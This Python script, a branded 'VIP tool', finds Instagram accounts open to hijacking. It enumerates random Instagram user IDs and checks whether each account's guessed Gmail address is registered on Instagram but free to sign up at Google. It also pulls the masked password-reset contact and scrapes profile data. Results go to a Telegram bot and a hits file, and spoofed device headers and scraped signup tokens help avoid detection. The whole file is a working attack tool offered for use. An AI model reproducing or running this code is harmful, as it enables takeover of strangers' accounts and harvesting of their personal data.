#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
𝐀ʟᴇxᴀ — 𝐕𝐈𝐏 𝐓ᴏᴏʟ (𝐏ʀᴇᴍɪᴜᴍ 𝐄ᴅɪᴛɪᴏɴ)
- 𝐈ɴꜰᴇʀɴᴏ 𝐔𝐈 + 𝐀ɴɪᴍᴀᴛᴇᴅ 𝐋ᴏᴀᴅᴇʀ
- 𝐂ʜᴀɴɴᴇʟ: @a3lxe | 𝐃ᴇᴠ: @xchumt
"""

import os
import sys
import re
import time
import random
import string
import json
import uuid
import base64
import hashlib
import threading
import requests
import httpx
from bs4 import BeautifulSoup
from hashlib import md5
from threading import Thread
from concurrent.futures import ThreadPoolExecutor
from user_agent import generate_user_agent

# ============================================================
# 🎨 𝐀ʟᴇxᴀ 𝐅ᴏɴᴛ 𝐒ʏsᴛᴇᴍ
# ============================================================
BOLD_SERIF = {
    'A':'𝐀','B':'𝐁','C':'𝐂','D':'𝐃','E':'𝐄','F':'𝐅','G':'𝐆','H':'𝐇',
    'I':'𝐈','J':'𝐉','K':'𝐊','L':'𝐋','M':'𝐌','N':'𝐍','O':'𝐎','P':'𝐏',
    'Q':'𝐐','R':'𝐑','S':'𝐒','T':'𝐓','U':'𝐔','V':'𝐕','W':'𝐖','X':'𝐗',
    'Y':'𝐘','Z':'𝐙',
}
SMALL_CAPS = {
    'a':'ᴀ','b':'ʙ','c':'ᴄ','d':'ᴅ','e':'ᴇ','f':'ꜰ','g':'ɢ','h':'ʜ',
    'i':'ɪ','j':'ᴊ','k':'ᴋ','l':'ʟ','m':'ᴍ','n':'ɴ','o':'ᴏ','p':'ᴘ',
    'q':'ǫ','r':'ʀ','s':'s','t':'ᴛ','u':'ᴜ','v':'ᴠ','w':'ᴡ','x':'x',
    'y':'ʏ','z':'ᴢ',
}

def alexa_font(text):
    out = []
    for word in text.split(' '):
        if not word:
            out.append('')
            continue
        first = word[0].upper()
        rest = word[1:].lower()
        styled = BOLD_SERIF.get(first, first)
        styled += ''.join(SMALL_CAPS.get(c, c) for c in rest)
        out.append(styled)
    return ' '.join(out)

A = alexa_font

# ============================================================
# 🎨 𝐈ɴꜰᴇʀɴᴏ 𝐂ᴏʟᴏrs
# ============================================================
A1    = "\x1b[38;5;214m"
A2    = "\x1b[38;5;196m"
A3    = "\x1b[38;5;226m"
A4    = "\x1b[1;37m"
DIM   = "\x1b[2;37m"
RESET = "\033[0m"
B     = "\033[1m"

INFERNO_RED = "\033[1;35m"
INFERNO_ORANGE = "\033[1;36m"
INFERNO_GOLD = "\033[1;33m"
W = "\033[1;37m"

GREEN = "\033[1;32m"
RED = "\033[1;31m"
WHITE = W
BOLD = B

# ============================================================
# 🎬 𝐔𝐈 𝐅ᴜɴᴄᴛɪᴏɴs
# ============================================================
def _ui_clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def _ui_brand():
    return f"""{INFERNO_RED}{B}
╭──────────────────────────────────────────────────────────────╮
│                                                              │
│              {W}{A('ALEXA')}{INFERNO_RED}                                       │
│          {W}{A('VIP TOOL')}{INFERNO_RED}   /   {W}{A('PREMIUM EDITION')}{INFERNO_RED}           │
│                                                              │
╰──────────────────────────────────────────────────────────────╯
{INFERNO_ORANGE}{B}              {A('PRIVATE CONSOLE')}
{RESET}"""

def _ui_section(title, subtitle=""):
    subtitle_line = f"\n{W}{subtitle}" if subtitle else ""
    return (
        f"{INFERNO_ORANGE}{B}╭─ {title.upper()} "
        f"{'─' * max(2, 54 - len(title))}╮{RESET}"
        f"{subtitle_line}\n"
    )

def _ui_prompt(label):
    return (
        f"{INFERNO_ORANGE}{B}╭─ {label.upper()} "
        f"{'─' * max(2, 54 - len(label))}╮\n"
        f"{INFERNO_ORANGE}╰─➤ {RESET}"
    )

# ============================================================
# 🎬 𝐀ɴɪᴍᴀᴛᴇᴅ 𝐋ᴏᴀᴅᴇʀ
# ============================================================
def animated_loader(text, duration=1.5):
    frames = ["⣾", "⣷", "⣯", "⣟", "⡿", "⢿", "⣻", "⣽"]
    end_time = time.time() + duration
    i = 0
    styled = A(text)
    while time.time() < end_time:
        sys.stdout.write(f"\r{INFERNO_RED}{B}✦ {styled} {frames[i % len(frames)]}{RESET}")
        sys.stdout.flush()
        time.sleep(0.08)
        i += 1
    sys.stdout.write(f"\r{GREEN}{B}✓ {styled} {A('DONE')}!{RESET}\n")
    sys.stdout.flush()

# ============================================================
# 🎬 𝐒ᴛᴀʀᴛᴜᴘ 𝐁ᴀɴɴᴇʀ
# ============================================================
_ui_clear()
print(_ui_brand())
print(_ui_section("Credentials", "Enter your Telegram details"))

TOKEN = input(_ui_prompt("Bot Token")).strip()
animated_loader("Verifying Bot Token", 1.0)

CHAT_ID = input(_ui_prompt("Chat ID")).strip()
animated_loader("Verifying Chat ID", 1.0)

_ui_clear()
print(_ui_brand())

# ============================================================
# 🔥 𝐀ʟʟ 𝐍ᴀᴍᴇs (𝟐𝟎𝟎+)
# ============================================================
ALL_NAMES = [
    "rahul", "raj", "amit", "sonu", "monu", "priya", "neha", "anjali", "meera",
    "rohit", "mohit", "sanjay", "vijay", "ajay", "suresh", "ramesh", "deepak",
    "sunil", "anil", "vikas", "naveen", "pankaj", "lata", "mala", "sita", "gita",
    "rita", "mina", "tina", "sana",
    "john", "jane", "mike", "sarah", "david", "emma", "oliver", "charlie",
    "james", "mary", "robert", "linda", "william", "barbara", "richard", "susan",
    "jack", "jill", "harry", "lucy", "george", "amelia", "oscar", "olivia",
    "alfie", "lily", "archie", "ella", "arthur", "grace", "freddie", "rose",
    "alexander", "dmitry", "sergei", "ivan", "vladimir", "anna", "olga", "maria",
    "ekaterina", "tatyana", "mikhail", "andrei", "viktoria", "elena", "yuri",
    "haruki", "yuki", "sakura", "ren", "haru", "mei", "sora", "aoi", "hina",
    "riku", "niko", "yuna", "itsuki", "hinata", "kaede",
    "joao", "maria", "jose", "ana", "pedro", "carlos", "fernanda", "lucas",
    "paula", "marcos", "camila", "rafael", "julia", "felipe", "larissa",
    "jean", "marie", "pierre", "sophie", "louis", "emma", "lucas", "lea",
    "gabriel", "camille", "jules", "ines", "adrien", "lois", "martin",
    "lukas", "anna", "max", "emma", "felix", "sophie", "paul", "mia",
    "jonas", "emily", "jakob", "lina", "tobias", "lea", "leon",
    "alessandro", "francesca", "marco", "giulia", "giuseppe", "anna", "antonio",
    "elena", "matteo", "sara", "andrea", "chiara", "luca", "martina", "davide",
    "alejandro", "carmen", "javier", "isabel", "manuel", "laura", "jose", "ana",
    "pedro", "maria", "david", "pilar", "juan", "teresa", "antonio",
    "mehmet", "ayse", "ali", "fatma", "ahmet", "mustafa", "zeynep", "hakan",
    "elif", "emre", "seda", "burak", "ozlem", "tugba", "mert",
    "mohammed", "fatima", "ahmed", "aisha", "ali", "maryam", "omar", "khadija",
    "abubakar", "hassan", "zainab", "abdullah", "halima", "ibrahim", "aminah",
    "muhammad", "zainab", "hassan", "fatima", "ali", "ayesha", "usman", "hadia",
    "adil", "rabia", "sara", "mahad", "huma", "sultan", "hina",
    "mohammad", "taslima", "rahim", "sajeda", "karim", "hasina", "jabbar",
    "shahida", "rahman", "sultana", "rokeya", "hamid", "nasima", "aziz", "maryam",
    "chidi", "ngozi", "amara", "uche", "chioma", "emeka", "funke", "chima",
    "oluchi", "ike", "folake", "tunde", "bisi", "segun", "joke",
    "thabo", "lebo", "neo", "mpho", "bongani", "lerato", "nelson", "zanele",
    "siya", "amahle", "lindiwe", "sipho", "nosipho", "vusi", "nomsa",
    "liam", "ava", "ethan", "olivia", "noah", "emma", "lucas", "charlotte",
    "jack", "abigail", "mason", "sofia", "logan", "avery", "jacob",
    "juan", "maria", "jose", "luz", "carlos", "guadalupe", "antonio", "juana",
    "miguel", "margarita", "francisco", "rosa", "jesus", "celia", "manuel",
    "pablo", "lucia", "gonzalo", "valentina", "franco", "agustina", "facundo",
]

# ============================================================
# 🔥 𝐂ᴏɴꜰɪɢ 𝐌ᴀɴᴀɢᴇʀ
# ============================================================
class ConfigManager:
    UID_RANGES = {
        "1": (210468786, 269736186),
        "2": (390438486, 495999999),
        "3": (1479010000, 1679010000),
        "4": (1700000000, 2400000000),
        "5": (3313668786, 3713668786),
        "6": (5398785217, 5999785217),
        "7": (7497939245, 8597939245),
        "8": (11254029834, 21254029834),
        "9": (210468786, 21254029834),
    }

    def __init__(self, token, chat_id):
        self.selected_year = None
        self.filter_type = None
        self.uid_min = None
        self.uid_max = None
        self.TOKEN = token
        self.CHAT_ID = chat_id
        self._select_year()
        self._select_filter()
        self._setup_uid_range()

    def _select_year(self):
        _ui_clear()
        print(_ui_brand())
        print(_ui_section("Year Select", "Choose target year range"))
        print(f"""{INFERNO_RED}{B}
│  {W}[1] 2012    [2] 2013    [3] 2014    [4] 2015
│  {W}[5] 2016    [6] 2017    [7] 2018    [8] 2019
│  {INFERNO_GOLD}[9] ALL YEARS  (2012 — 2019)
{INFERNO_ORANGE}{B}╰──────────────────────────────────────────────────────────────╯
{RESET}""")

        ch = input(_ui_prompt("Input")).strip()
        while ch not in ["1", "2", "3", "4", "5", "6", "7", "8", "9"]:
            print(f"{INFERNO_RED}{B}  ✖ Invalid — try again{RESET}")
            ch = input(_ui_prompt("Input")).strip()
        self.selected_year = ch
        animated_loader("Year Selected", 0.8)

    def _select_filter(self):
        _ui_clear()
        print(_ui_brand())
        print(_ui_section("Account Type", "Choose filter"))
        print(f"""{INFERNO_RED}{B}
│  {W}[1]  ZERO POST
│  {W}[2]  MORE THAN ZERO POST  {DIM}(LATE HITS){RESET}{INFERNO_RED}{B}
│  {INFERNO_GOLD}[3]  ALL  {DIM}(FAST MODE){RESET}{INFERNO_RED}{B}
{INFERNO_ORANGE}{B}╰──────────────────────────────────────────────────────────────╯
{RESET}""")

        ch2 = input(_ui_prompt("Input")).strip()
        while ch2 not in ["1", "2", "3"]:
            print(f"{INFERNO_RED}{B}  ✖ Wrong choice — enter 1, 2 or 3{RESET}")
            ch2 = input(_ui_prompt("Input")).strip()
        self.filter_type = ch2
        animated_loader("Filter Applied", 0.8)

    def _setup_uid_range(self):
        self.uid_min, self.uid_max = self.UID_RANGES[self.selected_year]

# ============================================================
# 🔥 𝐆ᴏᴏɢʟᴇ 𝐂ʜᴇᴄᴋᴇʀ
# ============================================================
class GoogleChecker:
    def __init__(self):
        self.yy = 'azertyuiopmlkjhgfdsqwxcvbn'
        self.token_ready = False
        Thread(target=self._refresh_token, daemon=True).start()

    def _generate_ua(self):
        return generate_user_agent()

    def _refresh_token(self):
        while True:
            try:
                n1 = ''.join(random.choice(self.yy) for _ in range(random.randrange(6, 9)))
                n2 = ''.join(random.choice(self.yy) for _ in range(random.randrange(3, 9)))
                host = ''.join(random.choice(self.yy) for _ in range(random.randrange(15, 30)))

                headers = {
                    "accept": "*/*",
                    "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
                    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
                    "google-accounts-xsrf": "1",
                    "sec-ch-ua": '"Not)A;Brand";v="24", "Chromium";v="116"',
                    "sec-ch-ua-mobile": "?1",
                    "sec-ch-ua-platform": '"Android"',
                    "user-agent": str(self._generate_ua()),
                }

                res1 = requests.get(
                    'https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB',
                    headers=headers
                )
                tok = re.search(
                    r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
                    res1.text
                ).group(2)

                cookies = {'__Host-GAPS': host}
                headers2 = {
                    'authority': 'accounts.google.com',
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'google-accounts-xsrf': '1',
                    'origin': 'https://accounts.google.com',
                    'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
                    'user-agent': self._generate_ua(),
                }

                data = {
                    'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                    'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
                }

                response = requests.post(
                    'https://accounts.google.com/_/signup/validatepersonaldetails',
                    cookies=cookies,
                    headers=headers2,
                    data=data,
                )

                tl = str(response.text).split('",null,"')[1].split('"')[0]
                host = response.cookies.get_dict()['__Host-GAPS']

                try:
                    os.remove('tl.txt')
                except:
                    pass

                with open('tl.txt', 'a') as f:
                    f.write(tl + '//' + host + '\n')

                time.sleep(random.uniform(10, 30))

            except Exception:
                time.sleep(random.uniform(5, 15))

    def check_availability(self, email):
        if '@' in email:
            email = str(email).split('@')[0]

        try:
            try:
                with open('tl.txt', 'r') as f:
                    o = f.read().splitlines()[0]
            except:
                time.sleep(2)
                with open('tl.txt', 'r') as f:
                    o = f.read().splitlines()[0]

            tl, host = o.split('//')
            cookies = {'__Host-GAPS': host}
            headers = {
                'authority': 'accounts.google.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'google-accounts-xsrf': '1',
                'origin': 'https://accounts.google.com',
                'referer': f'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL={tl}',
                'user-agent': self._generate_ua(),
            }

            params = {'TL': tl}
            data = (
                f'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F'
                f'&ddm=0&flowEntry=SignUp&service=mail&theme=mn'
                f'&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D'
                f'&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888'
                f'&cookiesDisabled=false'
                f'&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D'
                f'&gmscoreversion=undefined&flowName=GlifWebSignIn&'
            )

            response = requests.post(
                'https://accounts.google.com/_/signup/usernameavailability',
                params=params,
                cookies=cookies,
                headers=headers,
                data=data,
            )

            if '"gf.uar",1' in str(response.text):
                return 'good'
            elif '"er",null,null,null,null,400' in str(response.text):
                time.sleep(1)
                return self.check_availability(email)
            else:
                return 'bad'
        except:
            return self.check_availability(email)

# ============================================================
# 🔥 𝐈ɴsᴛᴀɢʀᴀᴍ 𝐂ʜᴇᴄᴋᴇʀ
# ============================================================
class InstagramChecker:
    def __init__(self, google_checker: GoogleChecker, config: ConfigManager):
        self.google = google_checker
        self.config = config

    def _generate_android_ua(self):
        devices = [
            {"brand": "samsung", "model": "SM-G973F", "device": "beyond1", "board": "exynos9820", "cpu": "exynos9820"},
            {"brand": "samsung", "model": "SM-A536B", "device": "a53x", "board": "s5e8825", "cpu": "exynos1280"},
            {"brand": "samsung", "model": "SM-S918B", "device": "dm1q", "board": "kalama", "cpu": "qcom"},
            {"brand": "Google", "model": "Pixel 6", "device": "raven", "board": "raven", "cpu": "gs101"},
            {"brand": "Google", "model": "Pixel 7", "device": "panther", "board": "panther", "cpu": "gs201"},
            {"brand": "Xiaomi", "model": "M2102J20SG", "device": "ares", "board": "mt6893", "cpu": "mtk"},
            {"brand": "Xiaomi", "model": "Redmi Note 10", "device": "sweet", "board": "sm6150", "cpu": "qcom"},
            {"brand": "OnePlus", "model": "ONEPLUS A6003", "device": "OnePlus6", "board": "sdm845", "cpu": "qcom"},
            {"brand": "OPPO", "model": "CPH2371", "device": "OP4F1F", "board": "mt6893", "cpu": "mtk"},
            {"brand": "HUAWEI", "model": "ELE-L29", "device": "HWELE", "board": "kirin980", "cpu": "hisilicon"},
        ]

        device = random.choice(devices)
        android_version = random.choice(["10", "11", "12", "13", "14"])
        api_level = {"10": "29", "11": "30", "12": "31", "13": "33", "14": "34"}[android_version]
        dpi = random.choice(["320", "360", "394", "411", "420", "440", "450", "480"])
        width = random.choice(["720", "1080", "1440"])
        height = random.choice(["1520", "1600", "2280", "2340", "2400", "2560", "3200"])
        instagram_ver = f"{random.randint(280, 340)}.0.0.{random.randint(10, 40)}.{random.randint(80, 150)}"
        locale = random.choice(["en_US", "en_GB", "ar_SA"])
        random_num = random.randint(300000000, 400000000)

        return (f"Instagram {instagram_ver} Android ({api_level}/{android_version}; "
                f"{dpi}dpi; {width}x{height}; {device['brand']}; {device['model']}; "
                f"{device['device']}; {device['board']}; {locale}; {random_num})")

    def get_rest_info(self, username):
        android_ua = self._generate_android_ua()
        ig_did = str(uuid.uuid4()).upper()
        mid = base64.b64encode(uuid.uuid4().bytes).decode()[:32]

        headers = {
            "User-Agent": android_ua,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "x-ig-app-id": "567067343352427",
            "x-ig-device-id": ig_did,
            "x-ig-connection-type": "WIFI",
            "x-ig-capabilities": "3brTvw==",
            "x-ig-www-claim": "0",
            "x-ig-ajax": str(random.randint(1000000000, 9999999999)),
            "x-csrftoken": "missing",
            "Origin": "https://www.instagram.com",
            "Referer": "https://instagram.com/accounts/password/reset/?source=fxcal",
            "Cookie": f"ig_did={ig_did}; mid={mid}; csrftoken=missing",
        }

        try:
            with httpx.Client(http2=True, headers=headers, timeout=20) as client:
                r = client.post(
                    "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/",
                    data={"email_or_username": username}
                ).text

            data = json.loads(r)
            if "contact_point" in data:
                return data["contact_point"]
        except:
            pass

        return "🔒 PRIVATE"

    def fetch_profile(self, username, domain="gmail.com"):
        url = f'https://www.instagram.com/{username}/'

        try:
            response = requests.get(url, timeout=15)
            soup = BeautifulSoup(response.text, 'html.parser')
            meta_description = soup.find('meta', attrs={'name': 'description'})
            name_tag = soup.find('meta', property='og:title')

            if meta_description and name_tag:
                content = meta_description.get('content').replace(',', '')
                parts = content.split()

                return {
                    'name': name_tag['content'].split('(@')[0].strip(),
                    'username': username,
                    'email': f"{username}@{domain}",
                    'followers': parts[0],
                    'following': parts[2],
                    'posts': parts[4],
                    'url': url,
                    'rest': self.get_rest_info(username)
                }
        except:
            pass

        return {
            'username': username,
            'email': f"{username}@{domain}",
            'url': url,
            'rest': self.get_rest_info(username)
        }

    def check_email(self, email):
        android_ua = self._generate_android_ua()

        url = "https://i.instagram.com/api/v1/users/check_email/"
        headers = {
            'User-Agent': android_ua,
            'content-type': "application/x-www-form-urlencoded; charset=UTF-8"
        }

        try:
            with httpx.Client(http2=True) as client:
                response = client.post(url, data=f"email={email}", headers=headers)

            if 'email_is_taken' in str(response.text):
                return True
            return False
        except:
            return False

# ============================================================
# 📊 𝐃ɪsᴘʟᴀʏ 𝐌ᴀɴᴀɢᴇʀ
# ============================================================
class DisplayManager:
    def __init__(self, config: ConfigManager):
        self.config = config
        self.hits = 0
        self.bad_insta = 0
        self.bad_email = 0
        self.current_email = ""
        self.results = []
        self.lock = threading.Lock()
        self._running = True
        self._start_display_thread()

    def _draw_panel(self):
        return f"""{INFERNO_RED}{B}
╭──────────────────────────────────────────────────────────────╮
│  {W}{A('HITS')}          {INFERNO_RED}➤  {INFERNO_GOLD}{self.hits}
{INFERNO_RED}│  {W}{A('BAD INSTA')}     {INFERNO_RED}➤  {W}{self.bad_insta}
{INFERNO_RED}│  {W}{A('BAD EMAIL')}     {INFERNO_RED}➤  {W}{self.bad_email}
{INFERNO_RED}│  {W}{A('SCANNING')}      {INFERNO_RED}➤  {INFERNO_ORANGE}{self.current_email[:34]}
{INFERNO_ORANGE}{B}╰──────────────────────────────────────────────────────────────╯
{RESET}"""

    def _start_display_thread(self):
        def update_loop():
            sys.stdout.write("\033[?25l")
            while self._running:
                panel_str = self._draw_panel()
                lines_count = len(panel_str.splitlines())
                sys.stdout.write(f"\033[{lines_count}A")
                sys.stdout.write(panel_str)
                sys.stdout.flush()
                time.sleep(0.3)
            sys.stdout.write("\033[?25h")
            sys.stdout.flush()

        Thread(target=update_loop, daemon=True).start()

    def stop(self):
        self._running = False

    def update_stats(self, hits=None, bad_insta=None, bad_email=None, current_email=None):
        with self.lock:
            if hits is not None:
                self.hits = hits
            if bad_insta is not None:
                self.bad_insta = bad_insta
            if bad_email is not None:
                self.bad_email = bad_email
            if current_email is not None:
                self.current_email = current_email

    def print_hit(self, msg):
        with self.lock:
            sys.stdout.write("\n")
            sys.stdout.write(GREEN + "=" * 55 + RESET + "\n")
            sys.stdout.write(msg + "\n")
            sys.stdout.write(GREEN + "=" * 55 + RESET + "\n")
            sys.stdout.flush()

# ============================================================
# 📨 𝐑ᴇᴘᴏʀᴛ 𝐌ᴀɴᴀɢᴇʀ — 𝐖ɪᴛʜ 𝐈ɴʟɪɴᴇ 𝐁ᴜᴛᴛᴏɴs
# ============================================================
class ReportManager:
    def __init__(self, config: ConfigManager):
        self.config = config
        self.channel_url = "https://t.me/a3lxe"
        self.dev_url = "https://t.me/xchumt"

    def _get_buttons(self):
        return {
            "inline_keyboard": [
                [
                    {"text": f"📢 {A('CHANNEL')}", "url": self.channel_url},
                    {"text": f"👑 {A('DEV')}", "url": self.dev_url},
                ]
            ]
        }

    def send_telegram(self, msg):
        try:
            requests.post(
                f"https://api.telegram.org/bot{self.config.TOKEN}/sendMessage",
                json={
                    "chat_id": self.config.CHAT_ID,
                    "text": msg,
                    "parse_mode": "HTML",
                    "reply_markup": self._get_buttons(),
                },
                timeout=15
            )
        except:
            pass

    def save_to_file(self, msg, filename='alexa_hits.txt'):
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(f'{msg}\n')

    def format_result(self, data, year, filter_type):
        if 'name' in data:
            msg = f"""
<b>🎯 {A('NEW HIT')} 🎯</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>👤 {A('NAME')}</b>       <i>➤</i>  <b>{data['name']}</b>
<b>🔖 {A('USERNAME')}</b>   <i>➤</i>  <b>@{data['username']}</b>
<b>📧 {A('EMAIL')}</b>      <i>➤</i>  <code>{data['email']}</code>

<b>📊 {A('STATS')}</b>
<b>├ 👥 {A('FOLLOWERS')}</b>  <i>➤</i>  <b>{data['followers']}</b>
<b>├ 🔄 {A('FOLLOWING')}</b>  <i>➤</i>  <b>{data['following']}</b>
<b>└ 📸 {A('POSTS')}</b>      <i>➤</i>  <b>{data['posts']}</b>

<b>🔐 {A('RESET MASK')}</b>
<i>└ {data['rest']}</i>

<b>🔗 {A('PROFILE')}</b>
<i>└</i> <a href="https://instagram.com/{data['username']}">instagram.com/{data['username']}</a>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>🚀 {A('POWERED BY')}</b> <i>@a3lxe</i>
<b>📢 @a3lxe   │   👑 @xchumt</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
        else:
            msg = f"""
<b>🎯 {A('NEW HIT')} 🎯</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>🔖 {A('USERNAME')}</b>   <i>➤</i>  <b>@{data['username']}</b>
<b>📧 {A('EMAIL')}</b>      <i>➤</i>  <code>{data['email']}</code>

<b>🔗 {A('PROFILE')}</b>
<i>└</i> <a href="https://instagram.com/{data['username']}">instagram.com/{data['username']}</a>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>🚀 {A('POWERED BY')}</b> <i>@a3lxe</i>
<b>📢 @a3lxe   │   👑 @xchumt</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
        return msg

# ============================================================
# 🔥 𝐔sᴇʀ 𝐂ᴏʟʟᴇᴄᴛᴏʀ
# ============================================================
class UserCollector:
    def __init__(self, config: ConfigManager, insta_checker: InstagramChecker,
                 display: DisplayManager, reporter: ReportManager):
        self.config = config
        self.insta = insta_checker
        self.display = display
        self.reporter = reporter

        self.found_usernames = set()
        self.processed_ids = set()
        self.lock = threading.Lock()
        self.hits = 0
        self.bad_insta = 0
        self.bad_email = 0

    def _get_year_display(self):
        year_map = {"1": 2012, "2": 2013, "3": 2014, "4": 2015,
                    "5": 2016, "6": 2017, "7": 2018, "8": 2019, "9": "All"}
        return year_map[self.config.selected_year]

    def _should_skip_user(self, user_data):
        username = user_data.get('username', '')

        if '_' in username:
            return True

        if len(username) < 8:
            return True

        is_private = user_data.get('is_private', True)
        follower_count = user_data.get('follower_count', 0)
        following_count = user_data.get('following_count', 0)
        media_count = user_data.get('media_count', 0)

        if self.config.filter_type == "1":
            if is_private or media_count > 0:
                return True
        elif self.config.filter_type == "2":
            if is_private or media_count == 0:
                return True

        return False

    def _generate_user_agent(self):
        rnd = str(random.randint(150, 999))
        return ("Instagram 311.0.0.32.118 Android ("
                + random.choice(["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"])
                + "; " + str(random.randint(100, 1300)) + "dpi; "
                + str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000)) + "; "
                + random.choice(["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME", "INFINIX"])
                + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986"
                + str(random.randint(111, 999)) + ")")

    def _get_random_id(self):
        while True:
            uid = str(random.randrange(self.config.uid_min, self.config.uid_max))
            with self.lock:
                if uid not in self.processed_ids:
                    self.processed_ids.add(uid)
                    return uid

    def _process_user(self):
        while True:
            try:
                uid = self._get_random_id()
                lsd = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=32))

                headers = {
                    'accept': '*/*',
                    'accept-language': 'en,en-US;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://www.instagram.com',
                    'referer': 'https://www.instagram.com/cristiano/following/',
                    'user-agent': self._generate_user_agent(),
                    'x-fb-friendly-name': 'PolarisProfilePageContentQuery',
                    'x-ig-app-id': '936619743392459',
                    'x-fb-lsd': lsd,
                }

                data = {
                    'lsd': lsd,
                    'fb_api_caller_class': 'RelayModern',
                    'fb_api_req_friendly_name': 'PolarisProfilePageContentQuery',
                    'variables': f'{{"enable_integrity_filters":true,"id":"{uid}","__relay_internal__pv__PolarisCannesGuardianExperienceEnabledrelayprovider":true,"__relay_internal__pv__PolarisCASB976ProfileEnabledrelayprovider":false,"__relay_internal__pv__PolarisWebSchoolsEnabledrelayprovider":false,"__relay_internal__pv__PolarisRepostsConsumptionEnabledrelayprovider":false}}',
                    'server_timestamps': 'true',
                    'doc_id': '26672929172408668',
                }

                response = requests.post(
                    'https://www.instagram.com/api/graphql',
                    headers=headers,
                    data=data,
                    timeout=15
                )

                try:
                    resp_json = response.json()
                except:
                    time.sleep(random.uniform(0.5, 1.5))
                    continue

                user_data = resp_json.get('data', {}).get('user', {})
                if not user_data:
                    time.sleep(random.uniform(0.5, 1.5))
                    continue

                username = user_data.get('username', '')

                with self.lock:
                    if username in self.found_usernames:
                        time.sleep(random.uniform(0.1, 0.3))
                        continue

                if self._should_skip_user(user_data):
                    time.sleep(random.uniform(0.1, 0.3))
                    continue

                with self.lock:
                    self.found_usernames.add(username)

                email = f"{username}@gmail.com"

                self.display.update_stats(current_email=email)

                time.sleep(random.uniform(0.3, 1.0))

                if self.insta.check_email(email):
                    time.sleep(random.uniform(0.3, 0.8))

                    if self.insta.google.check_availability(email) == 'good':
                        profile_data = self.insta.fetch_profile(username, "gmail.com")

                        with self.lock:
                            self.hits += 1
                            if self.hits % 10 == 0 and os.path.exists("tl.txt"):
                                os.remove("tl.txt")

                        self.display.update_stats(hits=self.hits)

                        year = self._get_year_display()
                        msg = self.reporter.format_result(profile_data, year, self.config.filter_type)
                        self.display.print_hit(msg)
                        self.reporter.send_telegram(msg)
                        self.reporter.save_to_file(msg)
                    else:
                        with self.lock:
                            self.bad_email += 1
                        self.display.update_stats(bad_email=self.bad_email)
                else:
                    with self.lock:
                        self.bad_insta += 1
                    self.display.update_stats(bad_insta=self.bad_insta)

                time.sleep(random.uniform(0.2, 0.8))

            except Exception:
                time.sleep(random.uniform(0.5, 2.0))
                continue

    def start(self, thread_count=30):
        threads = []
        for _ in range(thread_count):
            t = Thread(target=self._process_user)
            t.daemon = True
            t.start()
            threads.append(t)
        return threads

# ============================================================
# 🚀 𝐌ᴀɪɴ
# ============================================================
def main():
    config = ConfigManager(TOKEN, CHAT_ID)
    animated_loader("Initializing Core Modules", 1.5)

    google_checker = GoogleChecker()
    animated_loader("Starting Google Checker", 1.0)

    insta_checker = InstagramChecker(google_checker, config)
    animated_loader("Starting Instagram Checker", 1.0)

    display = DisplayManager(config)
    reporter = ReportManager(config)
    collector = UserCollector(config, insta_checker, display, reporter)

    animated_loader("Launching Scanner Engine", 1.2)

    threads = collector.start(thread_count=30)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        display.stop()
        print(f"\n{INFERNO_RED}{B}◄  {A('ALEXA — SESSION ENDED')}  ►{RESET}")

if __name__ == "__main__":
    main()
